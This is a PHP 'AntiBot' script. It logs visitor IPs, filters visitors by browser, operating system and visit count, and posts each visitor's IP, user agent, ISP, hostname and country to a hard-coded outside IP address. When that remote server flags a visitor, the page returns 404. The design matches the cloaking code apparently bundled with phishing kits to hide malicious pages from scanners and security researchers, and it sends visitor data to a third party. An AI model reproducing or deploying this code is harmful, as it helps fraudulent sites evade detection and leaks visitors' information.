<?php
		$xurl 		= 'http://104.225.140.249/AntiBot/chk.php';
		$user_agent = $_SERVER['HTTP_USER_AGENT'];
		$browsers 	=	get__Browser();
		$oss 		= get__OS();
		$ipss 		= get_client_ip();
		
if(!$ipss || empty($ipss) || $ipss == null) {header("HTTP/1.0 404 Not Found"); die();}

	$myfile= fopen("antibot.logs", "a");
	fwrite($myfile,"$ipss\n");
	fclose($myfile);

$r = rand(10,99);

if ($browsers == "Unknown Browser") {
	exit(header("HTTP/1.0 404 Not Found"));
}

if ($oss == "Unknown OS") {
	exit(header("HTTP/1.0 404 Not Found"));
}

$lines 	= file('antibot.logs'); // Our previouse visitors;
$ip 	= $ipss;    // Checking our target  try to test 192.168.1.1 also
$count 	= 0 ;
$target = array();

foreach ($lines as $line_num => $line) {

	global $ip;

	if (strpos($line, $ip) !==false) {

		$count++;
		$target[$ip] = $count;
	}
}



foreach($target as $name => $count){
	#echo "<b> This ip $name had been chicking our website ".$count."</b> times\n";
	if ($count > 10) exit(header("HTTP/1.0 404 Not Found"));
	else {
		$ch = curl_init("http://104.225.140.249/tools/ip_checker.php?ip=$ipss");
		//curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
		//curl_setopt($ch, CURLOPT_PROXY, "antibot.hopto.org:9050");
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER,false);
		curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
		curl_setopt($ch, CURLOPT_HTTPHEADER, array('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3835.0 Safari/537.36'));
		curl_setopt($ch, CURLOPT_POST, true);
		$sonuc = curl_exec($ch);
		$sonuc = json_decode($sonuc,true);

		curl_close($ch);
		//print_r($sonuc);

		if(!$sonuc || empty($sonuc) || $sonuc == null) {
			$isp        ="0";
			$hostname   ="0";
			$country    ="0";
		}else{
			if (isset($sonuc['hostname'])){

				@$hostname = @$sonuc['hostname'];
			}else{
				$hostname = "0";
			}
			@$isp 		= 	@$sonuc['org'];
			@$country	=	@$sonuc['country'];
		}

		$ch = curl_init($xurl);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER,false);
		curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
		curl_setopt($ch, CURLOPT_HTTPHEADER, array(
			'Content-type: application/x-www-form-urlencoded'

		));

		$postdata = http_build_query(
			array(
				'check' => 'true',
				'ip' => $ipss,
				'isp' => $isp,
				'ua' => $user_agent,
				'hostname' => $hostname,
				'country' => $country,
				'browser' => $browsers,
				'os' => $oss
			)
		);

		curl_setopt($ch, CURLOPT_POST, true);
		curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
		$sonuc = curl_exec($ch);

		curl_close($ch);
		#echo $sonuc;

		if (strpos($sonuc, "1") !== false) {
			exit(header("HTTP/1.0 404 Not Found"));
		}




	}
}


function get__Browser() {

	global $user_agent;

	$browser = "Unknown Browser";

	$browser_array = array(
		'/msie/i'      => 'Internet Explorer',
		'/firefox/i'   => 'Firefox',
		'/safari/i'    => 'Safari',
		'/chrome/i'    => 'Chrome',
		'/edge/i'      => 'Edge',
		'/opera/i'     => 'Opera',
		'/netscape/i'  => 'Netscape',
		'/maxthon/i'   => 'Maxthon',
		'/konqueror/i' => 'Konqueror',
		'/mobile/i'    => 'Handheld Browser'
	);

	foreach ($browser_array as $regex => $value)
		if (preg_match($regex, $user_agent))
			$browser = $value;

	return $browser;
}

function get__OS() {

	global $user_agent;

	$os_platform  = "Unknown OS";

	$os_array     = array(
		'/windows nt 10/i'      =>  'Windows 10',
		'/windows nt 6.3/i'     =>  'Windows 8.1',
		'/windows nt 6.2/i'     =>  'Windows 8',
		'/windows nt 6.1/i'     =>  'Windows 7',
		'/windows nt 6.0/i'     =>  'Windows Vista',
		'/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
		'/windows nt 5.1/i'     =>  'Windows XP',
		'/windows xp/i'         =>  'Windows XP',
		'/windows nt 5.0/i'     =>  'Windows 2000',
		'/windows me/i'         =>  'Windows ME',
		'/win98/i'              =>  'Windows 98',
		'/win95/i'              =>  'Windows 95',
		'/win16/i'              =>  'Windows 3.11',
		'/macintosh|mac os x/i' =>  'Mac OS X',
		'/mac_powerpc/i'        =>  'Mac OS 9',
		'/linux/i'              =>  'Linux',
		'/ubuntu/i'             =>  'Ubuntu',
		'/iphone/i'             =>  'iPhone',
		'/ipod/i'               =>  'iPod',
		'/ipad/i'               =>  'iPad',
		'/android/i'            =>  'Android',
		'/blackberry/i'         =>  'BlackBerry',
		'/webos/i'              =>  'Mobile'
	);

	foreach ($os_array as $regex => $value)
		if (preg_match($regex, $user_agent))
			$os_platform = $value;

	return $os_platform;
}


function get_client_ip() {

	$ipaddress = '';
	if (getenv('HTTP_CLIENT_IP'))
		$ipaddress = getenv('HTTP_CLIENT_IP');
	else if(getenv('HTTP_X_FORWARDED_FOR'))
		$ipaddress = getenv('HTTP_X_FORWARDED_FOR');
	else if(getenv('HTTP_X_FORWARDED'))
		$ipaddress = getenv('HTTP_X_FORWARDED');
	else if(getenv('HTTP_FORWARDED_FOR'))
		$ipaddress = getenv('HTTP_FORWARDED_FOR');
	else if(getenv('HTTP_FORWARDED'))
		$ipaddress = getenv('HTTP_FORWARDED');
	else if(getenv('REMOTE_ADDR'))
		$ipaddress = getenv('REMOTE_ADDR');
	else
		$ipaddress = 'UNKNOWN';
	return $ipaddress;
}
?>
